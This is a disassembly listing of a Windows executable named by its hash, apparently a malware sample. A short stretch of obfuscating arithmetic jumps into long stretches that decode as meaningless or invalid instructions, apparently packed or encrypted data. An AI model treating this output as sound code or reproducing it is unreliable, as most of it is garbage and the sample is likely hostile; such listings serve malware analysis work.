
8e6d981a214509a24d1886c9e972c50a8e732369a1c519b4caba85160deb650b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	sbb    DWORD PTR ds:0x42295a,0x42291e
  401019:	sub    eax,edx
  40101b:	push   edi
  40101c:	mov    edx,0x159a
  401021:	mov    edi,DWORD PTR [ebp-0x4c]
  401024:	mov    DWORD PTR [ebp-0x50],eax
  401027:	sbb    ecx,edi
  401029:	add    eax,eax
  40102b:	mov    DWORD PTR [ebp-0x4c],ecx
  40102e:	or     DWORD PTR [ebp-0x50],0xba68fc47
  401035:	or     DWORD PTR [ebp-0x4c],0x9c0a89d8
  40103c:	mov    eax,DWORD PTR [ebp-0x58]
  40103f:	mov    ecx,DWORD PTR [ebp-0x54]
  401042:	inc    edi
  401043:	mov    edx,DWORD PTR [ebp-0x58]
  401046:	adc    DWORD PTR ds:0x4228c2,0x7b28
  401050:	mov    edi,DWORD PTR [ebp-0x54]
  401053:	sub    eax,edx
  401055:	mov    edx,DWORD PTR ds:0x422926
  40105b:	mov    DWORD PTR [ebp-0x58],eax
  40105e:	sbb    ecx,edi
  401060:	xor    DWORD PTR ds:0x422936,ecx
  401066:	mov    DWORD PTR [ebp-0x54],ecx
  401069:	adc    edx,0x6dea
  40106f:	or     DWORD PTR [ebp-0x58],0xba68805f
  401076:	or     DWORD PTR [ebp-0x54],0x9c0a89d8
  40107d:	lea    eax,[ebp+0x20]
  401080:	mov    DWORD PTR [ebp-0xc],eax
  401083:	add    edx,edx
  401085:	mov    eax,ds:0x4220e0
  40108a:	mov    ecx,DWORD PTR [ebp-0xc]
  40108d:	mov    eax,DWORD PTR [eax]
  40108f:	xor    DWORD PTR ds:0x42293a,0x72a2
  401099:	add    eax,DWORD PTR [ecx]
  40109b:	xor    edx,edx
  40109d:	or     edx,DWORD PTR ds:0x422a4a
  4010a3:	mov    edx,DWORD PTR [edx]
  4010a5:	and    DWORD PTR ds:0x42299e,edx
  4010ab:	jmp    0x401635
  4010b0:	and    eax,0xffffffe4
  4010b3:	xor    eax,0xa0123954
  4010b8:	sbb    al,0x80
  4010ba:	mov    WORD PTR [esi+0x69],gs
  4010bd:	dec    edx
  4010be:	ss mov ah,0x16
  4010c1:	push   ss
  4010c2:	push   ss
  4010c3:	push   ss
  4010c4:	cmp    eax,0x90161604
  4010c9:	jmp    0x84beff93
  4010ce:	inc    eax
  4010cf:	mov    edi,0x241cf639
  4010d4:	dec    ecx
  4010d5:	popf   
  4010d6:	pusha  
  4010d7:	mov    edi,0xdc39fb4f
  4010dc:	rol    BYTE PTR [ebx+edx*8-0x3aaad908],0x9
  4010e4:	push   eax
  4010e5:	mov    dl,0xfe
  4010e7:	test   DWORD PTR [ecx+0x7894fd68],0xfdcbb128
  4010f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f2:	dec    esi
  4010f3:	sbb    DWORD PTR [eax+0x38],ecx
  4010f6:	xor    BYTE PTR [eax-0x36c9554f],dl
  4010fc:	pop    es
  4010fd:	cmp    edi,ebx
  4010ff:	dec    edx
  401100:	rcl    edx,cl
  401102:	inc    eax
  401103:	inc    ebp
  401104:	push   ecx
  401105:	jl     0x40110c
  401107:	pop    ss
  401108:	mov    esi,DWORD PTR [ebx-0x30]
  40110b:	dec    edx
  40110c:	dec    ebp
  40110d:	dec    esi
  40110e:	ror    BYTE PTR [eax+0x5f42789e],0x3a
  401115:	or     dl,bh
  401117:	mov    al,ds:0x42d8f959
  40111c:	daa    
  40111d:	bound  edi,QWORD PTR [edi-0x1d]
  401120:	scas   eax,DWORD PTR es:[edi]
  401121:	test   eax,0xa527f95d
  401126:	mov    ch,0x94
  401128:	pop    ds
  401129:	push   ss
  40112a:	inc    edi
  40112b:	fdiv   DWORD PTR [edx]
  40112d:	imul   esi,esp,0xd0d5aab1
  401133:	mov    eax,0x2ca27ede
  401138:	jecxz  0x4011a2
  40113a:	add    esp,DWORD PTR [ecx]
  40113c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40113d:	inc    ebp
  40113e:	fucomp st(6)
  401140:	loopne 0x401178
  401142:	mov    ds:0xf9f819cb,al
  401147:	hlt    
  401148:	push   ss
  401149:	rcl    DWORD PTR [ecx+0xd],1
  40114c:	out    0x16,eax
  40114e:	jmp    0xf33c01
  401153:	rol    esi,1
  401155:	retf   
  401156:	mov    dh,0x34
  401158:	xor    bh,dl
  40115a:	push   edx
  40115b:	and    BYTE PTR [ecx-0x7eb27591],bl
  401161:	inc    ebp
  401162:	fiadd  DWORD PTR [edx+0x1c1482ea]
  401168:	xchg   BYTE PTR [esi+ebx*1-0x75],cl
  40116c:	clc    
  40116d:	xchg   ebx,eax
  40116e:	ds repnz addr16 push esp
  401172:	test   ebx,eax
  401174:	and    al,0x38
  401176:	inc    eax
  401177:	int3   
  401178:	or     ebp,DWORD PTR [esi+0x6]
  40117b:	cwde   
  40117c:	dec    esp
  40117d:	jle    0x4011ca
  40117f:	adc    BYTE PTR [edi+0x74d15f0],0x8c
  401186:	daa    
  401187:	mov    ebp,0xecf7fcac
  40118c:	mov    dh,0x7f
  40118e:	imul   ecx,edi,0x39
  401191:	in     eax,dx
  401192:	jle    0x401155
  401194:	xlat   BYTE PTR ds:[ebx]
  401195:	sub    esi,DWORD PTR [ebp+0x4993cefb]
  40119b:	add    al,0x3
  40119d:	adc    eax,DWORD PTR [edi-0xc1add1a]
  4011a3:	dec    edx
  4011a4:	ss cld 
  4011a6:	nop
  4011a7:	int    0xcc
  4011a9:	jbe    0x401223
  4011ab:	(bad)  [edx]
  4011ad:	pop    es
  4011ae:	fsubr  QWORD PTR [ebx+0x4b75add9]
  4011b4:	pop    eax
  4011b5:	iret   
  4011b6:	aas    
  4011b7:	jae    0x401171
  4011b9:	inc    ecx
  4011ba:	jmp    0xfaf9:0xfec53a8f
  4011c1:	jg     0x401183
  4011c3:	push   ss
  4011c4:	(bad)  
  4011c5:	outs   dx,BYTE PTR ds:[esi]
  4011c6:	lods   eax,DWORD PTR ds:[esi]
  4011c7:	jle    0x4011dd
  4011c9:	add    eax,0xcde62b45
  4011ce:	xchg   edi,eax
  4011cf:	pop    ds
  4011d0:	adc    DWORD PTR [edi],ebx
  4011d2:	jnp    0x4011c5
  4011d4:	gs pusha 
  4011d6:	in     al,dx
  4011d7:	test   edi,ecx
  4011d9:	dec    ecx
  4011da:	add    esp,DWORD PTR [ecx]
  4011dc:	ret    0x3577
  4011df:	out    0xa,al
  4011e1:	lods   al,BYTE PTR ds:[esi]
  4011e2:	push   esi
  4011e3:	jno    0x401242
  4011e5:	outs   dx,BYTE PTR ds:[esi]
  4011e6:	xchg   esi,eax
  4011e7:	jge    0x401187
  4011e9:	cli    
  4011ea:	mov    al,ds:0xcd7868ba
  4011ef:	out    dx,eax
  4011f0:	stos   BYTE PTR es:[edi],al
  4011f1:	call   FWORD PTR [edi+ecx*2+0x6b7eec01]
  4011f8:	inc    ebx
  4011f9:	xchg   ecx,eax
  4011fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011fb:	cli    
  4011fc:	xchg   edx,eax
  4011fd:	mov    WORD PTR [eax],ds
  4011ff:	idiv   dl
  401201:	pop    ss
  401202:	(bad)  
  401203:	mov    ecx,0xb8db926c
  401208:	jno    0x401233
  40120a:	or     DWORD PTR [edx],0xd661700f
  401210:	push   0xe5d267ac
  401215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401216:	inc    ebp
  401217:	cmp    al,0x51
  401219:	mov    al,ds:0x8f4cd697
  40121e:	mov    al,ds:0xd3065200
  401223:	mov    ah,0xf1
  401225:	fwait
  401226:	mov    ecx,0x65c53bc9
  40122b:	inc    eax
  40122c:	mov    eax,0x1c01293e
  401231:	dec    esi
  401232:	push   ebx
  401233:	in     al,dx
  401234:	dec    edi
  401235:	pop    es
  401236:	inc    ebx
  401237:	xlat   BYTE PTR ds:[ebx]
  401238:	inc    esi
  401239:	into   
  40123a:	or     eax,0xd1806b76
  40123f:	inc    edx
  401240:	retf   
  401241:	sub    esi,DWORD PTR [ecx]
  401243:	clc    
  401244:	inc    edx
  401245:	scas   eax,DWORD PTR es:[edi]
  401246:	jg     0x401256
  401248:	adc    cl,al
  40124a:	test   BYTE PTR [ebx+0x5dc1e6b3],0x83
  401251:	lods   eax,DWORD PTR ds:[esi]
  401252:	pushf  
  401253:	fcom   DWORD PTR [ebx]
  401255:	js     0x4011e1
  401257:	mov    ah,0xb4
  401259:	xor    bl,BYTE PTR [edi+0x16293dfd]
  40125f:	mov    edi,0x814a64cc
  401264:	mov    al,ds:0xe22f6b83
  401269:	inc    edi
  40126a:	test   DWORD PTR [esi-0x3a],0xa1058a5a
  401271:	xchg   ebp,eax
  401272:	sub    DWORD PTR [edi+0x1da40469],ebx
  401278:	dec    ebp
  401279:	push   eax
  40127a:	and    eax,0xbbe64fd9
  40127f:	dec    ecx
  401280:	adc    al,0x4a
  401282:	lea    eax,[edi]
  401284:	lods   eax,DWORD PTR ds:[esi]
  401285:	stos   BYTE PTR es:[edi],al
  401286:	ficom  DWORD PTR [edx+0x50]
  401289:	jp     0x401263
  40128b:	xor    dl,BYTE PTR [eax-0x14fd4b6]
  401291:	das    
  401292:	pop    ebp
  401293:	int    0x3
  401295:	pop    ss
  401296:	push   ebx
  401297:	cmp    ebx,edx
  401299:	cli    
  40129a:	adc    DWORD PTR [ecx],0x881fe565
  4012a0:	cmp    al,0x64
  4012a2:	xor    BYTE PTR [ebx],0x8e
  4012a5:	ret    0xf5de
  4012a8:	dec    esp
  4012a9:	int    0x13
  4012ab:	shl    ch,0x5d
  4012ae:	xchg   ebp,eax
  4012af:	sbb    eax,0x4a6f9327
  4012b4:	jecxz  0x40128a
  4012b6:	cmc    
  4012b7:	addr16 gs into 
  4012ba:	lea    eax,[eax+edx*2]
  4012bd:	jl     0x401339
  4012bf:	add    edx,0xffffffc1
  4012c2:	cmp    al,0x9d
  4012c4:	adc    DWORD PTR [eax],ebx
  4012c6:	das    
  4012c7:	das    
  4012c8:	xchg   esp,eax
  4012c9:	jns    0x40125d
  4012cb:	in     al,dx
  4012cc:	cmp    ah,dh
  4012ce:	push   edx
  4012cf:	inc    edi
  4012d0:	imul   BYTE PTR [edx+0x55]
  4012d3:	mov    ch,0xa7
  4012d5:	sub    DWORD PTR [ebx-0x25cb29b4],ebp
  4012db:	push   es
  4012dc:	mov    al,0x59
  4012de:	mov    ah,0xc0
  4012e0:	cwde   
  4012e1:	popf   
  4012e2:	ret    0xf614
  4012e5:	addr16 mov ch,0x72
  4012e8:	out    0x59,eax
  4012ea:	cli    
  4012eb:	inc    edx
  4012ec:	(bad)  
  4012ed:	mov    ebx,ebp
  4012ef:	add    BYTE PTR [eax-0x2b],0x5
  4012f3:	jle    0x4012ae
  4012f5:	fidivr DWORD PTR [esi]
  4012f7:	sti    
  4012f8:	mov    WORD PTR [edi+0x36],fs
  4012fb:	in     eax,0x15
  4012fd:	sub    edx,DWORD PTR [esi-0x6a2027e1]
  401303:	pop    ebx
  401304:	sbb    al,0xa1
  401306:	dec    edx
  401308:	xor    BYTE PTR [esi],0xb4
  40130b:	or     DWORD PTR [ebx],ebp
  40130d:	sahf   
  40130e:	sbb    ebp,0x18c08b6b
  401314:	imul   esi,DWORD PTR [eax+0x72],0x2b
  401318:	cmp    ebx,esi
  40131a:	das    
  40131b:	mov    DWORD PTR [ebp+esi*4-0x3],esp
  40131f:	fcomp  QWORD PTR [edi]
  401321:	outs   dx,DWORD PTR ds:[esi]
  401322:	sbb    DWORD PTR [ebx+0x10],ebx
  401325:	outs   dx,BYTE PTR ds:[esi]
  401326:	jno    0x40132c
  401328:	int3   
  401329:	xchg   DWORD PTR [eax-0x65771e61],esi
  40132f:	pop    ebx
  401330:	pop    esp
  401331:	in     eax,0x63
  401333:	fist   WORD PTR [edx]
  401335:	jae    0x40137c
  401337:	xchg   ebx,eax
  401338:	mov    bl,0xd7
  40133a:	dec    edi
  40133b:	lds    edi,FWORD PTR fs:[ebp+esi*1+0x34b1e10a]
  401343:	mov    ebx,0x720ad07c
  401348:	pop    eax
  401349:	xchg   ebp,eax
  40134a:	aam    0xba
  40134c:	mov    eax,0x80553c1a
  401351:	test   eax,0xc0975e04
  401356:	loop   0x401304
  401358:	arpl   WORD PTR [ebx-0x19],dx
  40135b:	jmp    0x9d02:0x4cc5343e
  401362:	out    dx,al
  401363:	popa   
  401364:	ret    
  401365:	pop    ds
  401366:	mov    bh,0xa9
  401368:	mov    ch,ah
  40136a:	and    BYTE PTR [esi-0x5d79001],0x37
  401371:	ret    
  401372:	mov    bh,0xcc
  401374:	cld    
  401375:	cmp    edx,0x955ef632
  40137b:	xor    DWORD PTR [edi+eiz*8-0x72],ebx
  40137f:	xor    dh,BYTE PTR [ebp-0x62418705]
  401385:	dec    edx
  401386:	cs js  0x401352
  401389:	mov    edi,0x51f56097
  40138e:	and    esi,edi
  401390:	mov    bh,0xf4
  401392:	jg     0x401347
  401394:	pop    ecx
  401395:	stc    
  401396:	enter  0x8cba,0xc2
  40139a:	aaa    
  40139b:	jnp    0x401347
  40139d:	(bad)  
  40139e:	scas   al,BYTE PTR es:[edi]
  40139f:	xchg   edx,eax
  4013a0:	fs stos DWORD PTR es:[edi],eax
  4013a2:	lahf   
  4013a3:	neg    BYTE PTR ds:0x4ec1bbd8
  4013a9:	sub    eax,0x26bc37ef
  4013ae:	inc    edi
  4013af:	shr    BYTE PTR [edx+0x6f1de1ce],1
  4013b5:	sbb    al,0x2
  4013b7:	sub    al,0x4b
  4013b9:	xor    BYTE PTR [ecx+0x1413e83f],0xf2
  4013c0:	sahf   
  4013c1:	hlt    
  4013c2:	ds mov bh,0xd0
  4013c5:	fst    st(0)
  4013c7:	and    eax,0x81a067be
  4013cc:	pop    eax
  4013cd:	int3   
  4013ce:	sar    DWORD PTR [esi+0x14ba6a78],cl
  4013d4:	rcr    BYTE PTR [ebx+ecx*2-0x2a],0x19
  4013d9:	push   ss
  4013da:	in     al,dx
  4013db:	imul   ebx,DWORD PTR [eax+0x7f3580c4],0xffffffce
  4013e2:	sub    esi,ecx
  4013e4:	push   ss
  4013e5:	test   al,0x10
  4013e7:	int3   
  4013e8:	fcmovnb st,st(3)
  4013ea:	mov    DWORD PTR [edi],ecx
  4013ec:	jl     0x401370
  4013ee:	add    cl,ah
  4013f0:	mov    esp,0x62d2a3a5
  4013f5:	hlt    
  4013f6:	(bad)  [esi]
  4013f8:	push   es
  4013f9:	loop   0x4013d1
  4013fb:	or     al,0xde
  4013fd:	mov    ds:0xabb7e084,al
  401402:	ins    DWORD PTR es:[edi],dx
  401403:	inc    esp
  401404:	jnp    0x40139c
  401406:	mov    dl,0xa1
  401408:	pushf  
  401409:	xor    ah,al
  40140b:	pusha  
  40140c:	repnz mov bl,0xf4
  40140f:	scas   al,BYTE PTR es:[edi]
  401410:	pop    ecx
  401411:	push   ss
  401412:	int3   
  401413:	nop
  401414:	(bad)  
  401415:	in     al,0x3d
  401417:	fs mov eax,0x864859b3
  40141d:	pop    ebp
  40141e:	jge    0x401476
  401420:	mov    esp,0xe5de19a
  401425:	mov    ebp,0x95e29c3e
  40142a:	loope  0x401435
  40142c:	(bad)  
  40142d:	inc    eax
  40142e:	dec    eax
  40142f:	push   0xffffffee
  401431:	pop    ebp
  401432:	mov    eax,0xa4556091
  401437:	(bad)  
  401438:	mov    ds:0xf7487843,al
  40143d:	push   ecx
  40143e:	xchg   edi,eax
  40143f:	mov    ch,0x98
  401441:	xchg   ebp,eax
  401442:	cmp    eax,0x3ab81845
  401447:	xchg   edx,eax
  401448:	and    eax,0x49942da7
  40144d:	(bad)  
  40144e:	es dec ebx
  401450:	hlt    
  401451:	ds out dx,eax
  401453:	js     0x401424
  401455:	lods   eax,DWORD PTR ds:[esi]
  401456:	call   0xcdbc306d
  40145b:	xchg   edi,eax
  40145c:	popa   
  40145d:	in     al,dx
  40145e:	or     ecx,DWORD PTR [ebx]
  401460:	xchg   ebp,eax
  401461:	enter  0x5777,0x9
  401465:	sar    ebx,cl
  401467:	pop    edx
  401468:	mov    gs,WORD PTR [ecx]
  40146a:	outs   dx,DWORD PTR ds:[esi]
  40146b:	int    0x58
  40146d:	mov    edi,0x4b1f1450
  401472:	mov    ch,0x1f
  401474:	in     al,0xf4
  401476:	mov    bh,0xd0
  401478:	or     DWORD PTR [ebx+0x5719d4a7],ebp
  40147e:	loope  0x4014f6
  401480:	add    ebp,DWORD PTR [eax]
  401482:	shl    DWORD PTR [esi-0x3b],cl
  401485:	xor    esp,DWORD PTR [edi-0x2b944fcb]
  40148b:	add    eax,0x65a0d9b3
  401490:	popf   
  401491:	je     0x40148c
  401493:	fnsave [ecx]
  401495:	enter  0x43cb,0x7f
  401499:	sub    eax,ecx
  40149b:	and    BYTE PTR [esi+0x34],bh
  40149e:	add    esp,DWORD PTR [esi]
  4014a0:	js     0x8bc0e012
  4014a6:	cmp    dh,al
  4014a8:	cli    
  4014a9:	idiv   DWORD PTR [ecx+0x596fa6bd]
  4014af:	push   ebp
  4014b0:	into   
  4014b1:	gs inc eax
  4014b3:	cld    
  4014b4:	or     bh,BYTE PTR ds:[esi+0x4b27c8bd]
  4014bb:	loopne 0x4014cf
  4014bd:	retf   
  4014be:	mov    ds:0x1cd7e13e,eax
  4014c3:	xchg   ebp,eax
  4014c4:	rcl    DWORD PTR [ecx-0x2c0b8ba9],1
  4014ca:	mov    DWORD PTR [eax],edx
  4014cc:	(bad)  
  4014cd:	(bad)  
  4014ce:	jmp    0x401470
  4014d0:	scas   al,BYTE PTR es:[edi]
  4014d1:	dec    edi
  4014d2:	cld    
  4014d3:	mov    ebx,0x99eb2196
  4014d8:	cdq    
  4014d9:	call   0xffb9:0x9717811c
  4014e0:	xor    edi,ebp
  4014e2:	xchg   ebp,eax
  4014e3:	pop    ss
  4014e4:	ins    BYTE PTR es:[edi],dx
  4014e5:	pop    es
  4014e6:	inc    eax
  4014e7:	mov    bl,0x17
  4014e9:	sub    bl,BYTE PTR [eax+edi*4+0x6d]
  4014ed:	aad    0x31
  4014ef:	out    dx,al
  4014f0:	mov    cl,0x6d
  4014f2:	jo     0x401532
  4014f4:	xor    BYTE PTR es:[edx+0x4b],ch
  4014f8:	inc    eax
  4014f9:	test   BYTE PTR [eax],0x75
  4014fc:	call   0x8cb3:0xe62b89aa
  401503:	lea    ebx,[ebp-0x21]
  401506:	repnz cmp DWORD PTR [eax],esp
  401509:	loop   0x4014d9
  40150b:	aam    0xe6
  40150d:	or     BYTE PTR [edi],0x7c
  401510:	loopne 0x401564
  401512:	call   0xdeb1df3
  401517:	mov    bh,0x6f
  401519:	mov    esi,0x2a0d46b5
  40151e:	mov    BYTE PTR [ecx-0x6e00dcbb],0x55
  401525:	lds    edx,FWORD PTR ds:0xf4c0eff0
  40152b:	std    
  40152c:	mov    ebp,0xe111483b
  401531:	sub    eax,0x12e41107
  401536:	adc    ecx,esi
  401538:	jmp    0x401581
  40153a:	or     DWORD PTR [edi+0x68],edi
  40153d:	push   ds
  40153e:	cli    
  40153f:	or     BYTE PTR ss:[ebp+0xedbd8cf],dh
  401546:	push   ebp
  401547:	xchg   ebp,eax
  401548:	jg     0x401543
  40154a:	call   0xd742624a
  40154f:	out    dx,al
  401550:	aas    
  401551:	mov    dl,0x3d
  401553:	aas    
  401554:	cmc    
  401555:	add    eax,0xd5ac12e4
  40155a:	mov    DWORD PTR [eax],esp
  40155c:	mov    ebx,0xeb4e4ce
  401561:	scas   eax,DWORD PTR es:[edi]
  401562:	test   al,0xf3
  401564:	xor    eax,0x62c34051
  401569:	add    al,0x25
  40156b:	xchg   ebp,eax
  40156c:	pop    ebx
  40156d:	xlat   BYTE PTR ds:[ebx]
  40156e:	sub    esp,DWORD PTR [edi]
  401570:	push   cs
  401571:	and    eax,0xea007f8c
  401576:	and    al,0xa3
  401578:	jl     0x401546
  40157a:	pop    ecx
  40157b:	sub    DWORD PTR [ecx-0x47],0x6c
  40157f:	hlt    
  401580:	enter  0xe1fd,0x49
  401584:	jle    0x40154e
  401586:	arpl   bx,di
  401588:	mov    ebp,0xd2ddc9cc
  40158d:	pop    ecx
  40158e:	enter  0x42d1,0x47
  401592:	push   DWORD PTR [edi+0x5823efc]
  401598:	xchg   esp,eax
  401599:	outs   dx,DWORD PTR ds:[esi]
  40159a:	data16 or ah,BYTE PTR [ecx]
  40159d:	fisttp WORD PTR [edi+edi*4+0x3bfd67d2]
  4015a4:	in     eax,dx
  4015a5:	fmul   QWORD PTR [esi]
  4015a7:	std    
  4015a8:	div    DWORD PTR [ecx+0x1ab70ec9]
  4015ae:	jb     0x4015d1
  4015b0:	push   ecx
  4015b1:	xor    edx,DWORD PTR [edi]
  4015b3:	gs out 0x16,eax
  4015b6:	cmp    al,0x67
  4015b8:	and    ch,al
  4015ba:	mov    cs,WORD PTR [ecx]
  4015bc:	jecxz  0x40154d
  4015be:	adc    bh,BYTE PTR [ebx-0x74]
  4015c1:	pop    ebx
  4015c2:	in     al,dx
  4015c3:	add    al,0xc9
  4015c5:	sub    ebx,DWORD PTR [eax-0x48]
  4015c8:	and    dl,BYTE PTR [esi-0x63a668c3]
  4015ce:	pop    edi
  4015cf:	cmp    cl,BYTE PTR [esi-0x4fbecc04]
  4015d5:	add    eax,0x8da71dca
  4015da:	inc    esi
  4015db:	pop    ecx
  4015dc:	shr    BYTE PTR [esp+ebx*8+0x41b7183],cl
  4015e3:	cmp    DWORD PTR [edi],ebp
  4015e5:	popf   
  4015e6:	cmp    BYTE PTR [ebx-0x58d766f7],bh
  4015ec:	dec    edx
  4015ed:	repnz outs dx,BYTE PTR ds:[esi]
  4015ef:	pop    ecx
  4015f0:	mov    edx,0x37ca431d
  4015f5:	jbe    0x4015a2
  4015f7:	inc    ebx
  4015f8:	inc    si
  4015fa:	mov    ds,WORD PTR [eax]
  4015fc:	fistp  QWORD PTR [edi-0x1412617c]
  401602:	adc    BYTE PTR [edi+0x56],0xb7
  401606:	jp     0x4015d0
  401608:	xor    al,0xba
  40160a:	mov    edx,DWORD PTR [ebp+0x34feb41b]
  401610:	fcmove st,st(5)
  401612:	push   ebx
  401613:	hlt    
  401614:	ja     0x4015e1
  401616:	xchg   edx,eax
  401617:	xchg   edx,eax
  401618:	pop    es
  401619:	popf   
  40161a:	mov    bl,0xd7
  40161c:	pop    eax
  40161d:	sbb    DWORD PTR [ebx+0xe],ecx
  401620:	in     al,0x75
  401622:	mov    dh,0x3a
  401624:	fs dec eax
  401626:	jg     0x4015c0
  401628:	into   
  401629:	inc    ebx
  40162a:	dec    esp
  40162b:	or     dl,BYTE PTR ds:0xcd746773
  401631:	and    BYTE PTR [ecx+0x4e],ch
  401634:	push   esi
  401635:	mov    edi,0x2e9a655c
  40163a:	xor    edx,DWORD PTR ds:0x4228e2
  401640:	mov    DWORD PTR [ebp-0x14],eax
  401643:	add    DWORD PTR ds:0x4228a6,ebx
  401649:	mov    eax,DWORD PTR [ebp+0x18]
  40164c:	jmp    0x401bd6
  401651:	fdivr  DWORD PTR [ebp+0x2c]
  401654:	lds    ebp,FWORD PTR [eax]
  401656:	xchg   esp,eax
  401657:	pop    eax
  401658:	and    BYTE PTR [ecx+0x3ab2ceab],dl
  40165e:	sub    DWORD PTR [edx+esi*2+0x1616043d],esp
  401665:	cmp    eax,0xa3161604
  40166a:	lea    esi,[ecx+0x5ab1adc]
  401670:	lods   al,BYTE PTR ds:[esi]
  401671:	jbe    0x40162a
  401673:	aas    
  401674:	iret   
  401675:	mov    esi,0x38d172d6
  40167a:	fstp   DWORD PTR [eax]
  40167c:	cmp    eax,0xf6dc0c0d
  401681:	fwait
  401682:	(bad)  
  401684:	dec    eax
  401685:	pop    edx
  401686:	xchg   esi,eax
  401687:	pop    eax
  401688:	jne    0x4016c4
  40168a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40168b:	(bad)  
  40168c:	rcl    DWORD PTR [edx],0x55
  40168f:	sub    edi,DWORD PTR [edx+ebp*2+0x79]
  401693:	lahf   
  401694:	out    dx,al
  401695:	je     0x40166e
  401697:	add    BYTE PTR [edx],0x5a
  40169a:	out    0xb7,eax
  40169c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40169d:	xor    BYTE PTR [edx-0x23],ch
  4016a0:	sub    dh,dl
  4016a2:	in     eax,0x9a
  4016a4:	xor    bh,ch
  4016a6:	in     al,0xcd
  4016a8:	pop    ds
  4016a9:	dec    eax
  4016aa:	jnp    0x4016fd
  4016ac:	pusha  
  4016ad:	aaa    
  4016ae:	xchg   ecx,eax
  4016af:	jnp    0x401705
  4016b1:	push   ds
  4016b2:	mov    ds:0x41d7575e,al
  4016b7:	js     0x4016a1
  4016b9:	ins    BYTE PTR es:[edi],dx
  4016ba:	jae    0x401739
  4016bc:	in     eax,dx
  4016bd:	aad    0xdf
  4016bf:	jns    0x401728
  4016c1:	arpl   WORD PTR [ebx-0x60],di
  4016c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016c5:	pop    eax
  4016c6:	push   0x5e
  4016c8:	xor    DWORD PTR [eax-0x62],edi
  4016cb:	push   edx
  4016cc:	(bad)  
  4016cd:	lock mov ch,ah
  4016d0:	inc    BYTE PTR cs:[edi+0x39]
  4016d4:	ret    0x5738
  4016d7:	ja     0x401668
  4016d9:	sti    
  4016da:	in     al,0xa7
  4016dc:	inc    esp
  4016dd:	and    dl,bh
  4016df:	aam    0xba
  4016e1:	add    ch,ah
  4016e3:	popf   
  4016e4:	fcmovnu st,st(1)
  4016e6:	xchg   BYTE PTR ds:0x9f782948,bh
  4016ec:	dec    esp
  4016ed:	push   ss
  4016ee:	xchg   ebp,eax
  4016ef:	push   eax
  4016f0:	dec    eax
  4016f1:	scas   eax,DWORD PTR es:[edi]
  4016f2:	outs   dx,BYTE PTR ds:[esi]
  4016f3:	adc    cl,dh
  4016f5:	push   ds
  4016f6:	sahf   
  4016f7:	pop    esp
  4016f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016f9:	xchg   edx,eax
  4016fa:	xchg   ebp,eax
  4016fb:	(bad)
  4016fe:	inc    edi
  4016ff:	push   ebp
  401700:	sbb    eax,0xc896c19d
  401705:	lock inc esi
  401707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401708:	xchg   ebp,eax
  401709:	xor    ecx,DWORD PTR [ecx-0x57]
  40170c:	fdiv   st,st(6)
  40170e:	xor    al,BYTE PTR [ebx+0x7b1066e3]
  401714:	push   esi
  401715:	sub    ebp,DWORD PTR [ecx+eiz*2-0x30]
  401719:	mov    cl,0x92
  40171b:	popf   
  40171c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40171e:	push   es
  40171f:	xor    dl,BYTE PTR [edi-0x54]
  401722:	jl     0x401788
  401724:	stc    
  401725:	popf   
  401726:	inc    edi
  401727:	mov    bl,0x27
  401729:	sbb    ebp,DWORD PTR [edi+0x1e22bd4b]
  40172f:	adc    bh,BYTE PTR [esi-0x25]
  401732:	jb     0x4016ce
  401734:	(bad)  
  401735:	and    edi,DWORD PTR [esi]
  401737:	adc    al,0x21
  401739:	xor    eax,0x1fefea72
  40173e:	je     0x4016fb
  401740:	push   es
  401741:	ret    
  401742:	xlat   BYTE PTR ds:[ebx]
  401743:	pop    ecx
  401744:	jmp    0x4017b1
  401746:	and    DWORD PTR [eax+0x7a],esi
  401749:	retf   
  40174a:	mov    bl,0x1e
  40174c:	into   
  40174d:	push   ecx
  40174e:	mov    ch,0xb9
  401750:	adc    ah,0x60
  401753:	pop    ebp
  401754:	rcr    ebx,cl
  401756:	and    dh,bl
  401758:	add    esi,edx
  40175a:	dec    ebp
  40175b:	jle    0x401765
  40175d:	das    
  40175e:	mov    ch,0x93
  401760:	das    
  401761:	mov    ah,0x9f
  401763:	push   ebp
  401764:	stc    
  401765:	xchg   ebx,eax
  401766:	mov    ah,0x13
  401768:	pop    es
  401769:	les    edx,FWORD PTR [edx+esi*4+0x29]
  40176d:	sub    ah,al
  40176f:	fbstp  TBYTE PTR [ebp+0x39]
  401772:	inc    ebx
  401773:	sahf   
  401774:	jo     0x40172d
  401776:	mov    esp,0x4bf42592
  40177b:	in     eax,0xaf
  40177d:	test   edi,eax
  40177f:	jecxz  0x401750
  401781:	mov    ds:0xa3168330,al
  401786:	adc    al,0x3c
  401788:	mov    dx,0x4652
  40178c:	inc    eax
  40178d:	mov    DWORD PTR [edi-0x62],edi
  401790:	fsubr  DWORD PTR [eax-0x34d165e]
  401796:	pop    eax
  401797:	aam    0x73
  401799:	mov    edx,0x236d60da
  40179e:	dec    edx
  40179f:	xor    al,bh
  4017a1:	xchg   ebx,eax
  4017a2:	sub    al,0x9e
  4017a4:	sbb    BYTE PTR [ebx+esi*8+0x3a],dh
  4017a8:	jne    0x4017c0
  4017aa:	push   ecx
  4017ab:	lds    edx,FWORD PTR [ecx+0x39a436ae]
  4017b1:	lahf   
  4017b2:	push   esi
  4017b3:	out    0x18,eax
  4017b5:	push   esi
  4017b6:	out    dx,eax
  4017b7:	mov    bh,0x46
  4017b9:	into   
  4017ba:	push   ds
  4017bb:	stos   DWORD PTR es:[edi],eax
  4017bc:	ins    DWORD PTR es:[edi],dx
  4017bd:	enter  0x7b3a,0x4
  4017c1:	pop    ebx
  4017c2:	out    dx,al
  4017c3:	(bad)  
  4017c5:	inc    edi
  4017c6:	aad    0x55
